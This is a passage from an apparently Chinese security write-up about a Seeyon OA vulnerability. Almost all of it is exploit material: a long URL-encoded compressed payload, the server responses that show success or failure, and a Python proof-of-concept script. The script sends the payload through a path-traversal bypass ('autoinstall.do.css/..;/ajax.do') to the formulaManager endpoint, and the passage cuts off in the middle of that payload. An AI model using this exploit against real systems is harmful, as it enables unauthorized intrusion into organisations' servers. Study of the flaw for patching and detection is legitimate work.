class="variable">%C3</span><span class="variable">%97</span>D<span class="variable">%29</span><span class="variable">%5</span>Cm<span class="variable">%2</span>C<span class="variable">%1</span>F<span class="variable">%07</span><span class="variable">%2</span>F<span class="variable">%C3</span><span class="variable">%85</span>Q<span class="variable">%5</span>CD<span class="variable">%C2</span><span class="variable">%B6</span><span class="variable">%26</span><span class="variable">%C3</span><span class="variable">%B9</span><span class="variable">%C2</span><span class="variable">%90</span><span class="variable">%C3</span><span class="variable">%A8</span><span class="variable">%15</span><span class="variable">%C3</span><span class="variable">%A0p</span><span class="variable">%C3</span><span class="variable">%A1</span><span class="variable">%C2</span><span class="variable">%86</span><span class="variable">%2</span>C<span class="variable">%C3</span><span class="variable">%9</span>Ah<span class="variable">%C3</span><span class="variable">%83</span>J<span class="variable">%0</span>A<span class="variable">%C2</span><span class="variable">%87</span><span class="variable">%C3</span><span class="variable">%8</span>FN<span class="variable">%C2</span><span class="variable">%A4</span><span class="variable">%5</span>C<span class="variable">%C2</span><span class="variable">%B7DM</span><span class="variable">%00</span><span class="variable">%C3</span><span class="variable">%91</span>C<span class="variable">%28</span>b<span class="variable">%C3</span><span class="variable">%8</span>E<span class="variable">%C3</span><span class="variable">%96</span><span class="variable">%C2</span><span class="variable">%84</span><span class="variable">%C2</span><span class="variable">%ABe</span><span class="variable">%40</span><span class="variable">%2</span>C<span class="variable">%C2</span><span class="variable">%898</span><span class="variable">%03</span><span class="variable">%C3</span><span class="variable">%A2</span><span class="variable">%C2</span><span class="variable">%B8</span><span class="variable">%C2</span><span class="variable">%825</span><span class="variable">%3</span>EYp<span class="variable">%C2</span><span class="variable">%96</span><span class="variable">%26</span><span class="variable">%0</span>C<span class="variable">%C3</span><span class="variable">%A8</span><span class="variable">%7</span>B<span class="variable">%C2</span><span class="variable">%BAFq</span><span class="variable">%C3</span><span class="variable">%9</span>A<span class="variable">%C3</span><span class="variable">%B0</span><span class="variable">%C2</span><span class="variable">%A6</span><span class="variable">%C2</span><span class="variable">%9</span>F<span class="variable">%5</span>B<span class="variable">%C3</span><span class="variable">%BCJ</span><span class="variable">%00</span>K<span class="variable">%C2</span><span class="variable">%B5</span><span class="variable">%C3</span><span class="variable">%B8TFqmc</span><span class="variable">%C2</span><span class="variable">%93</span><span class="variable">%C3</span><span class="variable">%8</span>BH*va<span class="variable">%C3</span><span class="variable">%B9</span><span class="variable">%0</span>F<span class="variable">%C3</span><span class="variable">%A0_</span><span class="variable">%C2</span><span class="variable">%BE</span><span class="variable">%C3</span><span class="variable">%99</span><span class="variable">%C2</span><span class="variable">%A2</span><span class="variable">%1</span>E<span class="variable">%C2</span><span class="variable">%BA</span><span class="variable">%C3</span><span class="variable">%A2</span><span class="variable">%C2</span><span class="variable">%A2</span><span class="variable">%C2</span><span class="variable">%B2L5q</span><span class="variable">%C2</span><span class="variable">%B9</span><span class="variable">%C3</span><span class="variable">%A1</span><span class="variable">%C2</span><span class="variable">%A3</span><span class="variable">%24</span>*<span class="variable">%C2</span><span class="variable">%A9e</span>*<span class="number">7</span>iq<span class="variable">%C3</span><span class="variable">%B4m3</span><span class="variable">%60</span>mC<span class="number">8</span><span class="variable">%C2</span><span class="variable">%83</span>j<span class="number">2</span><span class="variable">%C2</span><span class="variable">%A3</span><span class="variable">%3</span>A<span class="number">7</span><span class="variable">%C3</span><span class="variable">%80</span><span class="variable">%C2</span><span class="variable">%96</span><span class="variable">%C2</span><span class="variable">%85</span>e<span class="variable">%C2</span><span class="variable">%A8</span><span class="variable">%18</span>D<span class="variable">%C2</span><span class="variable">%99</span>.<span class="variable">%C3</span><span class="variable">%8</span>F<span class="variable">%5</span>B<span class="variable">%C2</span><span class="variable">%BD</span><span class="variable">%C2</span><span class="variable">%838</span><span class="variable">%0</span>E<span class="variable">%28</span>F<span class="variable">%25</span><span class="variable">%C2</span><span class="variable">%89</span><span class="variable">%C2</span><span class="variable">%9</span>B<span class="variable">%C3</span><span class="variable">%84</span><span class="variable">%C3</span><span class="variable">%A3</span><span class="variable">%C2</span><span class="variable">%95</span><span class="variable">%01</span><span class="variable">%C2</span><span class="variable">%A0</span><span class="variable">%C2</span><span class="variable">%B4L</span><span class="variable">%C3</span><span class="variable">%A9-</span><span class="variable">%3</span>F<span class="variable">%C2</span><span class="variable">%B8Bc</span><span class="variable">%C2</span><span class="variable">%95</span><span class="variable">%3</span>A<span class="variable">%C3</span><span class="variable">%86</span><span class="variable">%C3</span><span class="variable">%86</span><span class="variable">%C3</span><span class="variable">%9</span>Fse<span class="variable">%00</span><span class="variable">%C3</span><span class="variable">%B8</span><span class="variable">%C2</span><span class="variable">%8</span>DoW<span class="variable">%01</span><span class="variable">%C3</span><span class="variable">%B2L</span><span class="variable">%15</span>K<span class="variable">%C2</span><span class="variable">%8</span>B<span class="variable">%0</span>CZ<span class="variable">%08</span><span class="variable">%C2</span><span class="variable">%8</span>Fh<span class="variable">%7</span>C<span class="variable">%2</span>C<span class="number">4</span>W<span class="variable">%C2</span><span class="variable">%B9</span><span class="variable">%C2</span><span class="variable">%B4l</span><span class="variable">%C3</span><span class="variable">%AD</span><span class="variable">%C3</span><span class="variable">%96</span>D<span class="variable">%C3</span><span class="variable">%856</span><span class="variable">%C3</span><span class="variable">%81</span><span class="variable">%C2</span><span class="variable">%B9</span><span class="variable">%7</span>Dl<span class="variable">%C2</span><span class="variable">%B1eQJ7</span><span class="variable">%C3</span><span class="variable">%93</span><span class="variable">%12</span><span class="variable">%C2</span><span class="variable">%ADI</span><span class="variable">%C2</span><span class="variable">%89</span><span class="variable">%5</span>D<span class="variable">%02</span>Ygz<span class="variable">%1</span>E<span class="variable">%C2</span><span class="variable">%9</span>DL<span class="variable">%C3</span><span class="variable">%B6</span><span class="variable">%C2</span><span class="variable">%99</span><span class="variable">%C3</span><span class="variable">%A6</span><span class="variable">%C2</span><span class="variable">%B4</span><span class="variable">%C3</span><span class="variable">%8</span>E<span class="variable">%C3</span><span class="variable">%BB</span><span class="variable">%C3</span><span class="variable">%996</span>j<span class="variable">%C2</span><span class="variable">%BDU</span><span class="variable">%40</span>s<span class="variable">%40</span><span class="variable">%C3</span><span class="variable">%B3w</span><span class="variable">%C3</span><span class="variable">%8</span>F<span class="variable">%5</span>B<span class="variable">%C2</span><span class="variable">%A4</span><span class="variable">%C2</span><span class="variable">%84</span><span class="variable">%C2</span><span class="variable">%80</span><span class="variable">%C3</span><span class="variable">%A0</span><span class="variable">%2</span>B<span class="variable">%14</span>K<span class="variable">%0</span>Cg<span class="variable">%C3</span><span class="variable">%82</span><span class="variable">%01</span>.W<span class="variable">%C2</span><span class="variable">%89</span>K<span class="variable">%C2</span><span class="variable">%80</span><span class="variable">%C3</span><span class="variable">%AF</span><span class="variable">%C3</span><span class="variable">%9</span>CXd<span class="variable">%1</span>F<span class="variable">%C3</span><span class="variable">%B6</span><span class="variable">%03</span><span class="variable">%C3</span><span class="variable">%BB</span><span class="variable">%C2</span><span class="variable">%B0</span><span class="variable">%C2</span><span class="variable">%A9</span><span class="variable">%C2</span><span class="variable">%B6</span><span class="variable">%C2</span><span class="variable">%86</span><span class="variable">%C2</span><span class="variable">%8</span>D<span class="variable">%C2</span><span class="variable">%ADP</span><span class="variable">%3</span>Fo<span class="variable">%0</span>F<span class="variable">%C3</span><span class="variable">%92</span><span class="variable">%C3</span><span class="variable">%80</span>B<span class="variable">%C3</span><span class="variable">%92</span><span class="variable">%08</span>p<span class="variable">%C3</span><span class="variable">%BA</span><span class="variable">%C2</span><span class="variable">%AD</span><span class="variable">%C2</span><span class="variable">%A9</span><span class="variable">%01</span><span class="variable">%12</span><span class="variable">%C2</span><span class="variable">%AE</span><span class="variable">%C3</span><span class="variable">%90</span>T<span class="variable">%0</span>D<span class="variable">%C3</span><span class="variable">%8</span>B<span class="variable">%28</span><span class="variable">%07</span><span class="variable">%C2</span><span class="variable">%B6</span><span class="variable">%C3</span><span class="variable">%A6</span><span class="variable">%23</span><span class="variable">%C2</span><span class="variable">%A8I</span><span class="variable">%C2</span><span class="variable">%A9S</span><span class="variable">%C2</span><span class="variable">%9</span>DG<span class="variable">%7</span>B<span class="variable">%0</span>E_<span class="variable">%C2</span><span class="variable">%9</span>D<span class="number">6</span><span class="variable">%C3</span><span class="variable">%86</span><span class="variable">%C3</span><span class="variable">%B1</span><span class="variable">%1</span>B<span class="variable">%C2</span><span class="variable">%BD</span><span class="variable">%26</span><span class="variable">%10</span><span class="variable">%C3</span><span class="variable">%839</span><span class="variable">%C2</span><span class="variable">%A6uU</span><span class="variable">%03</span><span class="variable">%C2</span><span class="variable">%97</span><span class="variable">%28</span>X<span class="variable">%C2</span><span class="variable">%9</span>E<span class="variable">%C2</span><span class="variable">%AE</span><span class="variable">%26</span><span class="variable">%C2</span><span class="variable">%AA</span><span class="variable">%C2</span><span class="variable">%BEA</span><span class="variable">%C3</span><span class="variable">%B2</span><span class="variable">%21</span><span class="variable">%0</span>B<span class="variable">%C3</span><span class="variable">%974</span><span class="variable">%06</span><span class="variable">%C3</span><span class="variable">%87</span><span class="variable">%C3</span><span class="variable">%9</span>C<span class="variable">%C3</span><span class="variable">%87</span><span class="variable">%1</span>BT<span class="variable">%C3</span><span class="variable">%A6</span><span class="variable">%C2</span><span class="variable">%B6</span><span class="variable">%09</span><span class="variable">%C3</span><span class="variable">%BC</span><span class="variable">%23</span><span class="variable">%C2</span><span class="variable">%A7</span><span class="variable">%C2</span><span class="variable">%87</span>u<span class="variable">%C2</span><span class="variable">%AC</span><span class="variable">%1</span>A<span class="variable">%C2</span><span class="variable">%A7</span><span class="variable">%0</span>BG<span class="variable">%7</span>E<span class="variable">%C2</span><span class="variable">%82</span><span class="variable">%C2</span><span class="variable">%AD</span><span class="variable">%C3</span><span class="variable">%8</span>A<span class="variable">%C2</span><span class="variable">%8</span>F<span class="variable">%3</span>F<span class="variable">%C3</span><span class="variable">%BC</span><span class="variable">%19</span><span class="variable">%C3</span><span class="variable">%99</span><span class="variable">%C2</span><span class="variable">%BF</span><span class="variable">%C3</span><span class="variable">%BE</span><span class="variable">%C2</span><span class="variable">%99</span><span class="variable">%C3</span><span class="variable">%88</span><span class="variable">%C2</span><span class="variable">%95</span><span class="variable">%C2</span><span class="variable">%84</span>d<span class="variable">%C2</span><span class="variable">%AD</span><span class="variable">%C2</span><span class="variable">%91</span>O<span class="variable">%C3</span><span class="variable">%AB</span><span class="variable">%7</span>C<span class="variable">%C2</span><span class="variable">%81</span><span class="variable">%C3</span><span class="variable">%8</span>AO<span class="variable">%C3</span><span class="variable">%96</span>o<span class="variable">%C3</span><span class="variable">%B8</span><span class="variable">%C3</span><span class="variable">%9</span>Ay<span class="variable">%C3</span><span class="variable">%A4</span><span class="variable">%12</span><span class="variable">%C2</span><span class="variable">%9</span>D<span class="variable">%C2</span><span class="variable">%A7</span><span class="variable">%C3</span><span class="variable">%B5</span><span class="variable">%C2</span><span class="variable">%89</span><span class="variable">%C2</span><span class="variable">%A1</span><span class="variable">%18</span><span class="variable">%24</span><span class="variable">%C2</span><span class="variable">%A0j</span><span class="variable">%C3</span><span class="variable">%B4</span><span class="variable">%C3</span><span class="variable">%9</span>A<span class="variable">%C3</span><span class="variable">%BA</span><span class="variable">%C3</span><span class="variable">%94</span>z<span class="variable">%C2</span><span class="variable">%8</span>D_<span class="variable">%C2</span><span class="variable">%BF</span><span class="variable">%C3</span><span class="variable">%96</span>F<span class="variable">%C2</span><span class="variable">%9</span>E<span class="variable">%C2</span><span class="variable">%9</span>E<span class="variable">%C2</span><span class="variable">%A9</span><span class="variable">%1</span>C<span class="variable">%C3</span><span class="variable">%84</span>V<span class="variable">%25</span><span class="variable">%C2</span><span class="variable">%9</span>C<span class="variable">%5</span>D<span class="variable">%C3</span><span class="variable">%96</span><span class="variable">%C2</span><span class="variable">%A6</span><span class="variable">%C3</span><span class="variable">%B9X</span><span class="variable">%C2</span><span class="variable">%A4</span><span class="variable">%C2</span><span class="variable">%B2</span><span class="variable">%28</span><span class="variable">%60</span>XMn<span class="variable">%C3</span><span class="variable">%90</span><span class="variable">%18</span><span class="variable">%C3</span><span class="variable">%A6</span><span class="variable">%C2</span><span class="variable">%AE</span><span class="variable">%C2</span><span class="variable">%81</span>o<span class="variable">%C3</span><span class="variable">%B4m</span><span class="variable">%C2</span><span class="variable">%BA</span><span class="variable">%C3</span><span class="variable">%97</span><span class="variable">%C2</span><span class="variable">%95</span><span class="variable">%C2</span><span class="variable">%85</span><span class="variable">%12</span><span class="variable">%C2</span><span class="variable">%AAs</span><span class="variable">%C2</span><span class="variable">%9</span>A<span class="variable">%C3</span><span class="variable">%97</span><span class="variable">%C3</span><span class="variable">%A2n</span><span class="variable">%C2</span><span class="variable">%977</span><span class="variable">%C3</span><span class="variable">%BD</span><span class="variable">%C3</span><span class="variable">%81</span><span class="variable">%C2</span><span class="variable">%A9x</span><span class="variable">%1</span>F<span class="variable">%C3</span><span class="variable">%A9</span><span class="variable">%C3</span><span class="variable">%84</span><span class="variable">%C2</span><span class="variable">%A6</span><span class="variable">%C2</span><span class="variable">%BD</span>*<span class="variable">%2</span>FW<span class="variable">%18</span><span class="variable">%C2</span><span class="variable">%98</span><span class="variable">%3</span>A<span class="variable">%06</span><span class="variable">%C3</span><span class="variable">%BC</span><span class="variable">%3</span>E<span class="variable">%C2</span><span class="variable">%B79</span><span class="variable">%C2</span><span class="variable">%9</span>D<span class="variable">%3</span>D<span class="variable">%12</span><span class="variable">%C3</span><span class="variable">%BD</span><span class="variable">%C3</span><span class="variable">%AD</span><span class="variable">%C2</span><span class="variable">%8</span>F<span class="variable">%1</span>C<span class="variable">%C3</span><span class="variable">%944</span><span class="variable">%C2</span><span class="variable">%9</span>D<span class="variable">%5</span>E<span class="variable">%C2</span><span class="variable">%97</span><span class="variable">%1</span>Cc<span class="variable">%C3</span><span class="variable">%AAgBc</span><span class="variable">%C2</span><span class="variable">%A0</span><span class="variable">%C3</span><span class="variable">%B1</span><span class="variable">%C3</span><span class="variable">%83</span><span class="variable">%C2</span><span class="variable">%95</span><span class="variable">%1</span>B<span class="variable">%29</span><span class="variable">%C2</span><span class="variable">%ACe</span><span class="variable">%08</span><span class="variable">%21</span><span class="variable">%C2</span><span class="variable">%8</span>D<span class="variable">%C2</span><span class="variable">%8</span>F<span class="variable">%C3</span><span class="variable">%BA</span><span class="variable">%C2</span><span class="variable">%A1</span><span class="variable">%C2</span><span class="variable">%97</span><span class="variable">%C3</span><span class="variable">%90</span>X<span class="variable">%C2</span><span class="variable">%A4</span><span class="variable">%C2</span><span class="variable">%A0</span><span class="variable">%0</span>A<span class="variable">%C2</span><span class="variable">%9</span>A<span class="variable">%C2</span><span class="variable">%9</span>E<span class="variable">%C3</span><span class="variable">%9</span>Es<span class="variable">%C3</span><span class="variable">%A3</span><span class="variable">%1</span>C<span class="variable">%C2</span><span class="variable">%8</span>A<span class="variable">%C3</span><span class="variable">%BA</span><span class="variable">%10</span><span class="variable">%C3</span><span class="variable">%92</span><span class="variable">%C3</span><span class="variable">%9</span>A<span class="variable">%C3</span><span class="variable">%AE</span><span class="variable">%C2</span><span class="variable">%A6</span><span class="variable">%C3</span><span class="variable">%A3</span><span class="variable">%C2</span><span class="variable">%A6</span><span class="variable">%27</span><span class="variable">%01</span><span class="variable">%C2</span><span class="variable">%A7T</span><span class="variable">%C2</span><span class="variable">%8</span>E<span class="number">9</span>a<span class="variable">%5</span>DQgw<span class="variable">%C3</span><span class="variable">%A1</span><span class="variable">%C2</span><span class="variable">%B5h</span><span class="variable">%C3</span><span class="variable">%AB</span><span class="variable">%C2</span><span class="variable">%BA</span>*<span class="variable">%5</span>C<span class="variable">%7</span>E<span class="variable">%C3</span><span class="variable">%BF</span><span class="variable">%C3</span><span class="variable">%B8</span><span class="variable">%3</span>E<span class="variable">%C3</span><span class="variable">%ADL</span><span class="variable">%C2</span><span class="variable">%9</span>AG<span class="variable">%7</span>D<span class="variable">%C2</span><span class="variable">%82</span>R<span class="variable">%C3</span><span class="variable">%90</span><span class="variable">%C2</span><span class="variable">%9</span>F<span class="variable">%C2</span><span class="variable">%BCh</span><span class="variable">%C3</span><span class="variable">%B3o</span><span class="variable">%C3</span><span class="variable">%83</span><span class="variable">%C2</span><span class="variable">%99</span><span class="variable">%07</span>bH<span class="variable">%07</span><span class="variable">%1</span>E<span class="variable">%C3</span><span class="variable">%9</span>E<span class="variable">%C3</span><span class="variable">%AFv</span><span class="variable">%C3</span><span class="variable">%96</span><span class="variable">%3</span>FW<span class="variable">%C3</span><span class="variable">%AA</span><span class="variable">%C3</span><span class="variable">%BDw</span><span class="variable">%C2</span><span class="variable">%AA</span><span class="variable">%5</span>B<span class="variable">%C2</span><span class="variable">%B3</span><span class="variable">%3</span>B<span class="variable">%C3</span><span class="variable">%93</span><span class="variable">%C3</span><span class="variable">%9</span>A<span class="variable">%C2</span><span class="variable">%B6L</span><span class="variable">%C3</span><span class="variable">%AF</span><span class="variable">%0</span>E<span class="variable">%C3</span><span class="variable">%98</span>o<span class="variable">%C3</span><span class="variable">%AFI</span><span class="variable">%7</span>E<span class="variable">%3</span>AQ<span class="variable">%C2</span><span class="variable">%80</span>f<span class="variable">%09</span><span class="variable">%3</span>C<span class="variable">%7</span>C<span class="variable">%C3</span><span class="variable">%A9</span><span class="variable">%1</span>C<span class="variable">%0</span>F<span class="variable">%C2</span><span class="variable">%8</span>B<span class="variable">%C2</span><span class="variable">%AF</span><span class="variable">%C3</span><span class="variable">%8</span>F<span class="variable">%1</span>F<span class="variable">%C2</span><span class="variable">%97</span><span class="variable">%C3</span><span class="variable">%84</span><span class="variable">%C3</span><span class="variable">%87</span><span class="variable">%7</span>D<span class="variable">%C3</span><span class="variable">%93</span>o<span class="variable">%18</span><span class="variable">%1</span>C<span class="variable">%C3</span><span class="variable">%B5</span><span class="variable">%3</span>E<span class="variable">%C2</span><span class="variable">%82</span><span class="variable">%C3</span><span class="variable">%BF</span><span class="variable">%C2</span><span class="variable">%9</span>F.<span class="variable">%C3</span><span class="variable">%80</span>q<span class="variable">%C3</span><span class="variable">%AAQ</span><span class="variable">%C3</span><span class="variable">%87</span><span class="variable">%7</span>E<span class="variable">%7</span>C<span class="variable">%C2</span><span class="variable">%AF</span><span class="variable">%C3</span><span class="variable">%B7</span><span class="variable">%21</span><span class="variable">%25</span><span class="variable">%C2</span><span class="variable">%A0wb</span><span class="variable">%C3</span><span class="variable">%92</span><span class="variable">%C3</span><span class="variable">%8</span>C<span class="variable">%C3</span><span class="variable">%89</span><span class="variable">%10</span><span class="variable">%60</span><span class="variable">%C3</span><span class="variable">%8</span>A<span class="variable">%C2</span><span class="variable">%B2</span><span class="variable">%C3</span><span class="variable">%AC</span><span class="variable">%3</span>D<span class="variable">%C2</span><span class="variable">%BCv</span><span class="variable">%7</span>F<span class="variable">%C3</span><span class="variable">%90</span><span class="variable">%25</span>I<span class="variable">%17</span><span class="variable">%C3</span><span class="variable">%A5k</span><span class="variable">%7</span>Dg<span class="variable">%C2</span><span class="variable">%97</span><span class="variable">%C3</span><span class="variable">%9</span>C<span class="variable">%C3</span><span class="variable">%AB</span><span class="variable">%C3</span><span class="variable">%BE</span><span class="variable">%C3</span><span class="variable">%BD</span><span class="variable">%2</span>FheA<span class="variable">%C3</span><span class="variable">%A4_</span><span class="variable">%05</span><span class="variable">%00</span><span class="variable">%00</span></span></span><br></pre></td></tr></table></figure>

<p>成功会返回</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"message"</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"details"</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"code"</span><span class="punctuation">:</span><span class="string">"0436821967"</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></table></figure>

<p>失败会返回</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"message"</span><span class="punctuation">:</span> <span class="string">"被迫下线，原因：与服务器失去连接"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"code"</span><span class="punctuation">:</span> <span class="string">"-1"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"details"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></table></figure></li>
<li><p>漏洞利用POC</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36m使用格式:  python3 poc.py                                            \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url_2 = target_url + <span class="string">"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip"</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'\033[36m[o] 正在请求: {}'</span>.<span class="built_in">format</span>(vuln_url_2))</span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    }</span><br><span class="line">    data = <span class="string">"managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C